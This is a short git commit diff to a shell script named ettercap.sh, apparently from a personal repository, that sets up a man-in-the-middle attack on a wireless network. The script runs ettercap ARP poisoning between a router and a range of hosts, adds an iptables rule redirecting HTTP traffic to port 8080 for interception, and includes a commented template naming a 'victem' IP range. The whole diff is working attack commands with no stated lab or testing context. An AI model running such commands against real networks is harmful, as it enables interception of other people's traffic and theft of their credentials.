55fa862c065c5903b55ddd6fbfa0471a78fe24af
johnbomba <bomba.john@gmail.com>
2018-09-28 11:43:02 -0400

    update ettercap script

--- ettercap.sh
+++ ettercap.sh
@@ -1,3 +1,7 @@
 #!usr/bin/bash
 
-ettercap -Tq -M arp:remote -i wlan0 /10.40.1.1// /10.40.1.100-150//
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 REDIRECT --to-port 8080
+
+ettercap -Tq -M arp:remote -i wlan0 -S /10.40.1.1// /10.40.1.100-150//
+# ettercap -Tq -M arp:remote -i wlan0 -S /<router_ip>// /<victem_ip_range>//
+
